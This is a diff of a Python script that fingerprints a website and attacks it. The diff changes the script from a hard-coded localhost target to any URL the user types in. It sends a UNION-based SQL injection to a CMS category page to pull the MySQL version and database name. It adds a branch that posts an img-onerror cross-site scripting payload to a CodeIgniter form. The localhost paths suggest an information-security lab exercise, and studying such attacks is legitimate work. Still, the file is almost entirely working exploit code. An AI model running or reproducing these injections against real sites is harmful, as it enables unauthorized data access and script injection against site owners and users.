@@ -1,4 +1,5 @@
 import mechanize
+import requests
 from bs4 import BeautifulSoup
 from bs4 import Comment
 
@@ -6,11 +7,12 @@ browser = mechanize.Browser()
 browser.set_handle_robots(False)
 
 #ask the user the url to exploit
-url = "http://localhost/InformationSecurity/CMSsite-master/"    #input("Enter the url of the website you want to exploit: ")
+#url = "http://localhost/InformationSecurity/CMSsite-master/"
+url = input("Enter the url of the website you want to exploit: ")
 
 try:
     browser.open(url)
-    
+
     print("\n" + "Title: " + browser.title() + "\n")
 
     page = browser.response().read()
@@ -18,6 +20,8 @@ try:
 
     #define the target
     target=0
+
+
 
     #Is it Victor Alagwu's Simple CMS?
     comments = soupParser.findAll(string=lambda text: isinstance(text, Comment))
@@ -28,17 +32,21 @@ try:
             target = 1
             break
 
-    
+    #Is it codeIgniter?
+    if "codeigniter" in url:
+        target = 2
+
+
     #show possible hacks for the target
     if target==1:
 
 
 
-        #make sure there is a slash at the end of the url 
+        #make sure there is a slash at the end of the url
         if url[-1] != '/':
             url = url + '/'
 
-        #get MySQL version and database name of the website  
+        #get MySQL version and database name of the website
         browser.open(url + "category.php?cat_id=-1+UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10;+--")
         page = browser.response().read()
         soupParser = BeautifulSoup(page, "html.parser")
@@ -48,6 +56,38 @@ try:
 
         authors = soupParser.findAll("h3")
         print("Database name: " + authors[0].a.text)
+
+    if target==2:
+        r = requests.get(url) #"http://localhost/codeigniter/index.php/xssdemo"
+        soup = BeautifulSoup(r.content, "html.parser")
+
+        print('Form where the malicious code has to be injected:')
+        print()
+
+        form = soup.find('form')
+        print (form)
+        print()
+
+        payload =  '<img/src=">" onerror=alert(1)>'
+
+        print("Payload:")
+        print()
+        print(payload)
+        print()
+
+        postdata = {
+                "xss" : payload
+               }
+
+        r = requests.post(url, data=postdata)
+
+        soup = BeautifulSoup(r.content, "html.parser")
+
+        print('Injected code:')
+        print()
+        print (soup.find('img'))
+
+
     elif target==0:
         print("I cannot define the target")
 
